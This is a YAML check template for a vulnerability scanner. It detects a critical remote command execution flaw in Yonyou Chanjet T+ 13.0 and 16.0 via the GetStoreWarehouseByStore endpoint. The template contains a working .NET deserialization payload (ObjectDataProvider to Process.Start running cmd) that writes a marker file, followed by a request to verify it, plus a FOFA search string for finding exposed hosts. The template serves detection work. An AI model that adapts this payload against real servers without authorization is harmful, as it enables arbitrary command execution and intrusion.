id: yonyou-chanjet-tplus-getstorewarehousebystore-rce

info:
  name: 用友 畅捷通 T+ GetStoreWarehouseByStore 远程命令执行漏洞
  author: zan8in
  severity: critical
  verified: true
  description: |-
    用友畅捷通Tplus存在前台远程代码执行漏洞,攻击者可利用GetStoreWarehouseByStore 方法注入序列化的payload,执行任意命令。最终造成服务器敏感性信息泄露或代码执行。
    fofa: app="畅捷通-TPlus"
  solutions: |
    畅捷通Tplus 13.0 
    畅捷通Tplus 16.0
  reference:
    - https://mp.weixin.qq.com/s/RjzeOi4JLUL_djBOoQ2sJA
  tags: yonyou,chanjet,tplus,rce
  created: 2023/07/08
  requires: [chanjet]
  requires-mode: opportunistic

set:
  filename: randomLowercase(6)
  rbody: randomLowercase(30)
rules:
  r0:
    request:
      method: POST
      path: /tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore
      headers:
        X-Ajaxpro-Method: GetStoreWarehouseByStore
      body: |
        {
          "storeID":{
            "__type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
            "MethodName":"Start",
            "ObjectInstance":{
              "__type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
              "StartInfo":{
                "__type":"System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
                "FileName":"cmd",
                "Arguments":"/c echo {{rbody}} > {{filename}}.txt"
              }
            }
          }
        }
    expression: response.status == 200 && response.body.bcontains(b'System.ArgumentException')
  r1:
    request:
      method: GET
      path: /tplus/{{filename}}.txt
    expression: |
      response.status == 200 && 
      response.body.bcontains(bytes(rbody))
expression: r0() && r1()
